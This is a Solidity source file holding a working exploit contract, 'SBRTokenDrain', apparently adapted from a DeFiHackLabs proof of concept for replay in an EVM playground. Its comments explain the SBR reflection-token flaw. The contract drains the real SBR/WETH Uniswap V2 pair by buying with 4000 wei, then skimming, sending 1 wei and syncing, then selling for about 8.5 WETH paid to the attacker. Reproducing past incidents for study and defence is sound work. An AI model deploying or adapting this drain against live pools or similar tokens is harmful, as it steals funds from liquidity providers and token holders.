// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

// Synthetic standalone exploit for the EVM Playground (2025-03-SBRToken).
//
// The DeFiHackLabs PoC (test/SBRToken_exp.sol) deploys `AttackerC` with
// `new AttackerC{value: 0.000000000000004 ether}()` (4000 wei) — the
// constructor only records `attacker = msg.sender`, and the entire attack
// runs in a SEPARATE `attack()` call the test invokes right after deploy.
// The 4000 wei sent at deploy time is not spent by the constructor itself —
// it sits on the contract and is spent by `attack()`'s first call
// (`swapExactETHForTokensSupportingFeeOnTransferTokens{value: 4000}`).
//
// The playground's recorder deploys the exploit contract with a plain
// `runCall` that never attaches `value` (see recordExploit.ts's deploy
// step), so the contract never receives the 4000 wei balance a real
// `new AttackerC{value: 4000}()` would give it. This synthetic version is a
// byte-for-byte faithful copy of AttackerC with ONE structural change: the
// 4000 wei is sent via a post-deploy `setup` `rawCall` (a plain native
// transfer to the deployed contract, mirroring the constructor's original
// `{value: 4000}`) instead of at deploy time. `attack()` is copied verbatim
// and is the only recorded call, exactly matching the original PoC's attack
// surface and profit.
//
// Root cause: SBR is a fee-on-transfer token with a "reflection" style
// internal ledger (`_rOwned`) that scales real balances by a shared ratio
// (`_getRate()` = total reflected supply / total token supply). Sending a
// TINY real transfer (1 wei of SBR) into the pool, then calling
// `sync()`, forces the pair's cached reserves to snap to whatever the
// token's `balanceOf()` reports for the pair AFTER that transfer/skim
// sequence — while a preceding `skim()` (with no minimum-output check)
// already siphons any of the pair's own token surplus out. The combined
// skim + 1-wei transfer + sync sequence desynchronizes the pair's cached
// SBR reserve from its real, fee-adjusted balance far enough that the
// following `swapExactTokensForETHSupportingFeeOnTransferTokens` sell of
// the attacker's SBR is priced against a reserve that dramatically
// undervalues the attacker's SBR relative to the pair's real WETH holdings,
// paying out ~8.495 WETH for spending only 4000 wei of ETH.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface IRouter {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface Uni_Pair_V2 {
    function skim(address to) external;
    function sync() external;
}

address constant SBR = 0x460B1AE257118Ed6F63Ed8489657588a326a206D;
address constant wETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

address constant UniswapV2Router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
address constant UniswapV2Pair = 0x3431c535dDFB6dD5376E5Ded276f91DEaA864FF2;

contract SBRTokenDrain {
    address attacker;

    // Verbatim copy of AttackerC's original constructor body, minus the
    // `payable` msg.value capture (the 4000 wei is delivered separately by a
    // `setup` `rawCall` — see the config's comment for why).
    constructor() {
        attacker = msg.sender;
    }

    // Verbatim copy of AttackerC.attack() from test/SBRToken_exp.sol.
    function attack() public {
        address[] memory path = new address[](2);
        path[0] = wETH;
        path[1] = SBR;
        IRouter(UniswapV2Router).swapExactETHForTokensSupportingFeeOnTransferTokens{value: 4000}(
            0, path, address(this), block.timestamp + 100
        );

        Uni_Pair_V2(UniswapV2Pair).skim(UniswapV2Pair);

        IERC20(SBR).transfer(UniswapV2Pair, 1);

        Uni_Pair_V2(UniswapV2Pair).sync();

        IERC20(SBR).approve(UniswapV2Router, type(uint256).max);

        uint256 balance = IERC20(SBR).balanceOf(address(this));
        path[0] = SBR;
        path[1] = wETH;
        IRouter(UniswapV2Router).swapExactTokensForETHSupportingFeeOnTransferTokens(
            balance, 0, path, attacker, block.timestamp + 100
        );
    }

    receive() external payable {}
}
